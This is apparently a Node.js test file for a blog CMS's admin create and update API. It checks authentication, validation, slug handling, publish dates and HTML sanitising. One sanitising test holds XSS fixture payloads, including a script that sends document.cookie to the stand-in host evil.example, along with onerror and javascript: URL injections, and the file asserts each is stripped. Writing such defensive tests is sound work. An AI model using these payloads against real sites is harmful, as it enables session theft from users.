import './setup.js';
import test from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import mongoose from 'mongoose';

import app from '../app.js';
import Blog from '../models/Blog.js';
import User from '../models/User.js';
import { createJWT } from '../utils/tokenUtils.js';

// The write path, end to end through the real route: real authentication, real
// validation, real sanitising, real slug generation. Only Mongoose is replaced.

const ADMIN_ID = new mongoose.Types.ObjectId();
const BLOG_ID = new mongoose.Types.ObjectId();
const ADMIN_TOKEN = createJWT({ userId: String(ADMIN_ID), role: 'admin', tokenVersion: 0 });

const chain = (result) => {
  const q = { select: () => q, sort: () => q, skip: () => q, limit: () => q, lean: async () => result };
  q.then = (resolve, reject) => Promise.resolve(result).then(resolve, reject);
  return q;
};

const admin = (req) => req.set('Cookie', [`token=${ADMIN_TOKEN}`]);

const VALID = {
  title: 'How We Rebuilt Our Analytics Pipeline',
  description: 'A long-form account of the migration, the mistakes and what we would do differently.',
  content: '<p>Some body copy that is long enough to pass validation.</p>',
  author: 'Admin',
};

// Swaps model methods for the duration of a test and puts them back afterwards.
const withBlog = async (stubs, run) => {
  const restore = [];
  const patch = (target, key, value) => {
    restore.push([target, key, target[key]]);
    target[key] = value;
  };

  patch(User, 'findById', () => chain({ _id: ADMIN_ID, role: 'admin', tokenVersion: 0 }));
  Object.entries(stubs).forEach(([key, value]) => patch(Blog, key, value));

  try {
    return await run();
  } finally {
    restore.reverse().forEach(([target, key, value]) => {
      target[key] = value;
    });
  }
};

const docQuery = (doc) => {
  const q = { select: () => q, lean: async () => doc };
  q.then = (resolve, reject) => Promise.resolve(doc).then(resolve, reject);
  return q;
};

const existingBlog = (overrides = {}) => {
  const doc = {
    _id: BLOG_ID,
    title: VALID.title,
    description: VALID.description,
    content: VALID.content,
    author: VALID.author,
    slug: 'how-we-rebuilt-our-analytics-pipeline',
    image: null,
    status: 'published',
    publishedAt: new Date('2024-01-02T03:04:05.000Z'),
    createdAt: new Date('2024-01-01T00:00:00.000Z'),
    saved: 0,
    save: async function save() {
      this.saved += 1;
    },
    toJSON() {
      return { ...this, saved: undefined, save: undefined, toJSON: undefined };
    },
    ...overrides,
  };
  return doc;
};

// ==========================================
// CREATE
// ==========================================

test('a valid post is created with a server-generated slug and a publish date', async () => {
  let created = null;

  await withBlog(
    {
      findOne: () => chain(null),
      create: async (doc) => {
        created = doc;
        return { ...doc, _id: BLOG_ID };
      },
    },
    async () => {
      const res = await admin(request(app).post('/api/v1/blogs')).field(VALID.title ? 'title' : 'x', VALID.title)
        .field('description', VALID.description)
        .field('content', VALID.content)
        .field('author', VALID.author);

      assert.equal(res.status, 201);
      assert.equal(res.body.success, true);
      assert.equal(created.slug, 'how-we-rebuilt-our-analytics-pipeline');
      assert.equal(created.status, 'published');
      assert.ok(created.publishedAt instanceof Date, 'a published post records when it went live');
    }
  );
});

test('a post created as a draft has no publish date', async () => {
  let created = null;

  await withBlog(
    { findOne: () => chain(null), create: async (doc) => { created = doc; return { ...doc, _id: BLOG_ID }; } },
    async () => {
      const res = await admin(request(app).post('/api/v1/blogs'))
        .field('title', 'A Draft In Progress')
        .field('description', VALID.description)
        .field('content', VALID.content)
        .field('author', VALID.author)
        .field('status', 'draft');

      assert.equal(res.status, 201);
      assert.equal(created.status, 'draft');
      assert.equal(created.publishedAt, null);
    }
  );
});

test('two posts with the same title get different slugs', async () => {
  const taken = new Set();
  let created = null;

  await withBlog(
    {
      findOne: (query) => chain(taken.has(query.slug) ? { _id: BLOG_ID } : null),
      create: async (doc) => {
        created = doc;
        taken.add(doc.slug);
        return { ...doc, _id: BLOG_ID };
      },
    },
    async () => {
      const post = () =>
        admin(request(app).post('/api/v1/blogs'))
          .field('title', 'Weekly Notes')
          .field('description', VALID.description)
          .field('content', VALID.content)
          .field('author', VALID.author);

      assert.equal((await post()).status, 201);
      const first = created.slug;
      assert.equal((await post()).status, 201);
      assert.equal(first, 'weekly-notes');
      assert.equal(created.slug, 'weekly-notes-2');
    }
  );
});

test('stored content is sanitized, not just rendered safely', async () => {
  let created = null;

  await withBlog(
    { findOne: () => chain(null), create: async (doc) => { created = doc; return { ...doc, _id: BLOG_ID }; } },
    async () => {
      const res = await admin(request(app).post('/api/v1/blogs'))
        .field('title', 'Security Post')
        .field('description', VALID.description)
        .field('author', VALID.author)
        .field(
          'content',
          '<p onclick="steal()">Hello</p><script>fetch("https://evil.example?c="+document.cookie)</script>' +
            '<img src=x onerror=alert(1)><a href="javascript:alert(1)">click</a><iframe src="https://evil.example"></iframe>'
        );

      assert.equal(res.status, 201);
      assert.ok(!created.content.includes('<script'), 'no script tag is stored');
      assert.ok(!created.content.includes('onerror'), 'no inline event handler is stored');
      assert.ok(!created.content.includes('onclick'), 'no inline event handler is stored');
      assert.ok(!created.content.includes('javascript:'), 'no javascript: URL is stored');
      assert.ok(!created.content.includes('<iframe'), 'no iframe is stored');
      assert.ok(created.content.includes('Hello'), 'the legitimate text survives');
    }
  );
});

test('fields the CMS does not expose cannot be injected', async () => {
  let created = null;

  await withBlog(
    { findOne: () => chain(null), create: async (doc) => { created = doc; return { ...doc, _id: BLOG_ID }; } },
    async () => {
      const res = await admin(request(app).post('/api/v1/blogs'))
        .field('title', 'Mass Assignment Attempt')
        .field('description', VALID.description)
        .field('content', VALID.content)
        .field('author', VALID.author)
        .field('slug', 'i-pick-my-own-url')
        .field('_id', '000000000000000000000001')
        .field('publishedAt', '1999-01-01T00:00:00.000Z')
        .field('__v', '0');

      assert.equal(res.status, 201);
      assert.equal(created.slug, 'mass-assignment-attempt', 'the server owns the slug');
      assert.ok(created.publishedAt instanceof Date);
      assert.ok(created.publishedAt.getFullYear() >= 2024, 'a caller cannot backdate a post');
      assert.ok(!('_id' in created), 'the id is assigned by the database');
      assert.ok(!('__v' in created));
    }
  );
});

test('incomplete or malformed posts are rejected', async () => {
  const cases = [
    ['a missing description', { title: 'Valid Title Here', content: VALID.content, author: 'Admin' }],
    ['a missing author', { title: 'Valid Title Here', description: VALID.description, content: VALID.content }],
    ['an empty content', { title: 'Valid Title Here', description: VALID.description, content: '', author: 'Admin' }],
    ['a one-word title', { title: 'a', description: VALID.description, content: VALID.content, author: 'Admin' }],
    ['an unknown status', { ...VALID, status: 'archived' }],
    ['a javascript image', { ...VALID, image: 'javascript:alert(1)' }],
    ['a data uri image', { ...VALID, image: 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=' }],
  ];

  for (const [label, payload] of cases) {
    let created = false;
    await withBlog(
      { findOne: () => chain(null), create: async () => { created = true; } },
      async () => {
        const req = admin(request(app).post('/api/v1/blogs'));
        Object.entries(payload).forEach(([key, value]) => req.field(key, value));
        const res = await req;

        assert.equal(res.status, 400, `${label} -> ${res.status}`);
        assert.equal(res.body.success, false, label);
        assert.ok(res.body.msg, label);
        assert.equal(created, false, `${label}: nothing was stored`);
      }
    );
  }
});

// ==========================================
// UPDATE
// ==========================================

const patch = (id, fields) => {
  const req = admin(request(app).patch(`/api/v1/blogs/${id}`));
  Object.entries(fields).forEach(([key, value]) => req.field(key, value));
  return req;
};

test('editing a title never moves the published URL', async () => {
  const doc = existingBlog();

  await withBlog(
    { findById: () => docQuery(doc), findOne: () => chain(null) },
    async () => {
      const res = await patch(BLOG_ID, { title: 'How We Rebuilt Our Analytics Pipeline (Again)' });

      assert.equal(res.status, 200);
      assert.equal(doc.slug, 'how-we-rebuilt-our-analytics-pipeline', 'the slug is untouched');
      assert.equal(doc.title, 'How We Rebuilt Our Analytics Pipeline (Again)');
      assert.equal(doc.saved, 1);
    }
  );
});

test('updated content is sanitized on the way in', async () => {
  const doc = existingBlog();

  await withBlog(
    { findById: () => docQuery(doc), findOne: () => chain(null) },
    async () => {
      const res = await patch(BLOG_ID, {
        content: '<p>Updated body</p><script>alert(1)</script>',
      });

      assert.equal(res.status, 200);
      assert.ok(!doc.content.includes('<script'));
      assert.ok(doc.content.includes('Updated body'));
    }
  );
});

test('unpublishing and republishing keeps the original publish date', async () => {
  const doc = existingBlog();
  const originalDate = doc.publishedAt;

  await withBlog(
    { findById: () => docQuery(doc), findOne: () => chain(null) },
    async () => {
      assert.equal((await patch(BLOG_ID, { status: 'draft' })).status, 200);
      assert.equal(doc.status, 'draft');
      assert.equal(doc.publishedAt, originalDate, 'hiding a post is not a new publication');

      assert.equal((await patch(BLOG_ID, { status: 'published' })).status, 200);
      assert.equal(doc.status, 'published');
      assert.equal(doc.publishedAt, originalDate);
    }
  );
});

test('a draft that goes live for the first time is stamped', async () => {
  const doc = existingBlog({ status: 'draft', publishedAt: null });

  await withBlog(
    { findById: () => docQuery(doc), findOne: () => chain(null) },
    async () => {
      assert.equal((await patch(BLOG_ID, { status: 'published' })).status, 200);
      assert.ok(doc.publishedAt instanceof Date);
    }
  );
});

test('an empty patch is refused instead of silently doing nothing', async () => {
  const doc = existingBlog();

  await withBlog(
    { findById: () => docQuery(doc), findOne: () => chain({ _id: BLOG_ID }) },
    async () => {
      const res = await patch(BLOG_ID, {});
      assert.equal(res.status, 400);
      assert.equal(res.body.msg, 'No fields to update');
      assert.equal(doc.saved, 0, 'nothing was written');
    }
  );
});

test('an invalid status is refused and nothing is written', async () => {
  const doc = existingBlog();

  await withBlog(
    { findById: () => docQuery(doc), findOne: () => chain({ _id: BLOG_ID }) },
    async () => {
      const res = await patch(BLOG_ID, { status: 'deleted' });
      assert.equal(res.status, 400);
      assert.equal(doc.saved, 0);
    }
  );
});

test('a missing post is a clean 404', async () => {
  await withBlog(
    { findById: () => docQuery(null), findOne: () => chain(null) },
    async () => {
      const res = await patch(BLOG_ID, { title: 'A Perfectly Fine Title' });
      assert.equal(res.status, 404);
      assert.equal(res.body.success, false);
      assert.ok(!res.body.stack);
    }
  );
});
